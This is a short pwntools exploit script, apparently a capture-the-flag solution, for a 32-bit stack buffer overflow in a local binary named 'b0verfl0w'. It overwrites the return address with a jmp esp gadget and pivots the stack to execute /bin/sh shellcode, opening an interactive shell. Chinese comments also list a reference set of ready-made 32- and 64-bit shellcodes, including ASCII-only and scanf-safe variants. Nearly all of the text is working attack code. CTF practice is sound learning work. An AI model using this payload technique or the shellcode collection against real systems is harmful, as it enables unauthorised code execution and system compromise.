from pwn import*
context(os="linux", arch="i386")
p = process("./b0verfl0w")

p.recvuntil('What\'s your name?\n')

# 32位 短字节shellcode --> 21字节
# # \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
# 32位 纯ascii字符shellcode
# # PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA
# 32位 scanf可读取的shellcode
# # \xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh
# 64位 scanf可读取的shellcode 22字节
# # \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
# 64位 较短的shellcode  23字节
# # \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05
# 64位 纯ascii字符shellcode
# # Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
shellcode = b'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
jmp_esp   = 0x08048504

# 在s中写入shellcode
# 执行jmp_esp使代码跳转到栈上执行
# 执行命令将栈顶上移并执行写入的shellcode
payload  = shellcode
payload += b'a' * (0x20 - len(shellcode) + 4)
payload += p32(jmp_esp) + asm("sub esp, 0x28;jmp esp")

p.sendline(payload)
p.recv()
p.interactive()